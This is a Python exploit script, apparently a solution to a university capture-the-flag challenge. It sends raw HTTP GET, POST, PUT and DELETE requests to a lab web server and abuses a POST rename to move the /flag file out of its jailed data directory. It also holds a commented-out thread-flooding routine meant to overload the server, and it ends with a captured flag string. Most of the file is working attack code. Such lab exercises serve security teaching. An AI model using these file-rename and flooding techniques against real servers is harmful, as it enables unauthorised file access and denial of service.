from pwn import *
import string
from sys import argv
import sys
import os
import time
import subprocess
import socket
import threading


context.arch = 'amd64'
context.os = 'linux'
info = log.info
context.log_level = 'debug'

binfile = './vuln'
elf = context.binary = ELF(binfile)


# for debugging
gdbscript = '''
file /gdbscript/vuln
b main
b make_festive
#getline
#b *$base("vuln")+0x17cf
#check input i
#b *$base("vuln")+0x185d
# inside check 2
#b *$base("vuln")+0x136e
'''.format(**locals())
with open("gdbscript", "w") as f:
    f.write(gdbscript)


# start remote
#p = remote('tasks.ws24.softsec.rub.de', 33049)

#p=remote("127.0.0.1", 1024)
#p2=process('tmux split-window -h docker exec -ti $(docker ps -q -f "ancestor=softsec/santa") /bin/sh -c \'gdb -x /gdbscript/gdbscript -p $(pgrep -n vuln)\'', shell=True)
#sleep(6)
#p2.close()




host = 'httpd.tasks.softsec.rub.de'
port = 1024




def cyclic_find_bytes(b):
    to_be_found = bytes.fromhex(hex(b)[2:])[::-1]
    return cyclic_find(to_be_found)






def http_get(host, path):
    # Create a socket object
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Get the IP address of the host
    server_ip = socket.gethostbyname(host)
    print("IP:", server_ip)
    
    # Connect to the server on port 1024 (HTTP)
    client_socket.connect((server_ip, 1024))
    
    # Create the GET request string
    request = f"GET {path} HTTP/1.1\r\nHost: {host}:1024\r\nConnection: close\r\n\r\n"
    
    # Send the GET request to the server
    client_socket.sendall(request.encode())
    
    # Receive the response from the server
    response = b""
    while True:
        data = client_socket.recv(4096)
        print(data)
        if not data:
            break
        response += data
    
    # Close the socket
    client_socket.close()
    
    # Print the response
    print(response.decode())




def http_post(host, path, data):
    # Create a socket object
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Get the IP address of the host
    server_ip = socket.gethostbyname(host)
    print("IP:", server_ip)
    
    # Connect to the server on port 1024 (HTTP)
    client_socket.connect((server_ip, 1024))
    
    # Prepare the HTTP POST request
    content_length = len(data)
    request = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}:1024\r\n"
        f"Content-Length: {content_length}\r\n"
        f"Connection: close\r\n\r\n"
        f"{data}"
    )
    
    # Send the POST request to the server
    client_socket.sendall(request.encode())
    
    # Receive the response from the server
    response = b""
    while True:
        data = client_socket.recv(4096)
        print(data)
        if not data:
            break
        response += data
    
    # Close the socket
    client_socket.close()
    
    # Print the response
    print(response.decode())







def http_put(host, path, data):
    # Create a socket object
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Get the IP address of the host
    server_ip = socket.gethostbyname(host)
    print("IP:", server_ip)
    
    # Connect to the server on port 1024 (HTTP)
    client_socket.connect((server_ip, 1024))
    
    # Prepare the PUT request headers
    content_length = len(data)
    request = (
        f"PUT {path} HTTP/1.1\r\n"
        f"Host: {host}:1024\r\n"
        f"Content-Length: {content_length}\r\n"
        f"Connection: close\r\n\r\n"
        f"{data}"
    )
    
    # Send the PUT request
    client_socket.sendall(request.encode())
    
    # Receive the response from the server
    response = b""
    while True:
        chunk = client_socket.recv(4096)
        print(chunk)
        if not chunk:
            break
        response += chunk
    
    # Close the socket
    client_socket.close()
    
    # Print the server's response
    print(response.decode())







def http_delete(host, path):
    # Create a socket object
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Get the IP address of the host
    server_ip = socket.gethostbyname(host)
    print("IP:", server_ip)
    
    # Connect to the server on port 1024 (HTTP)
    client_socket.connect((server_ip, 1024))
    
    # Prepare the DELETE request headers
    request = (
        f"DELETE {path} HTTP/1.1\r\n"
        f"Host: {host}:1024\r\n"
        f"Connection: close\r\n\r\n"
    )
    
    # Send the DELETE request
    client_socket.sendall(request.encode())
    
    # Receive the response from the server
    response = b""
    while True:
        chunk = client_socket.recv(4096)
        print(chunk)
        if not chunk:
            break
        response += chunk
    
    # Close the socket
    client_socket.close()
    
    # Print the server's response
    print(response.decode())









# I can't get the file with GET containing ../
# I'm jailed inside /home/user/data

# POST can rename files though
# so maybe it's possible to rename /flag to /home/user/data/flag

# PUT can create new files
#     and also new folders
# DELETE can remove files













http_get(host, 'flag')
http_get(host, '/flag2')


# new name can be absolute it seems? ~line 250
def rename_file(old_name, new_name):
    data = new_name
    http_post(host, old_name, data)


# Usage Example
http_put(host, '/flag', "PUT test")


rename_file("/flag", "flag2")


# Usage Example
#http_delete(host, '/flag2')














# too_many = False

# def send_message(host, port):
    # global too_many
    # try:
        ##Create a TCP/IP socket
        # sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        ##Connect the socket to the server
        # server_address = (host, port)
        # sock.connect(server_address)
        
        # try:
            ##Send a message to the server
            ##print(f"Sending message: {message}")
            ##print(too_many)
            # if too_many:
                # sock.sendall(b"Eat your vegetables\nGet presents\n"*200)
                # response = sock.recv(1024)
                # if b"softsec" in response:
                    # print(response)
            # else:
                # sock.sendall(b"Eat your vegetables\n"*200)
                # response = sock.recv(1024)
                # if b"Server is overloaded" in response:
                    # too_many = True

            # return response
        # finally:
            ## Close the socket
            # sock.close()
    # except Exception as e:
        # pass #print(f"An error occurred: {e}")






# def spawn_threads(num_threads, host, port):
    # threads = []
    # for i in range(num_threads):
        ## Create a new thread for each message send operation
        # thread = threading.Thread(target=send_message, args=(host, port))
        # threads.append(thread)
        # thread.start()

    ## Wait for all threads to complete
    # for thread in threads:
        # thread.join()


# sys.stderr = open(os.devnull, 'w')

# for i in range(1000):
    # spawn_threads(50000, host, port)





#p.interactive()

#softsec{loKfFeJZfCWJeB0LBcJzzlvqliMJKiy58-RSNTfiJJLGrtm_h0ajNy0dW1L96A-G}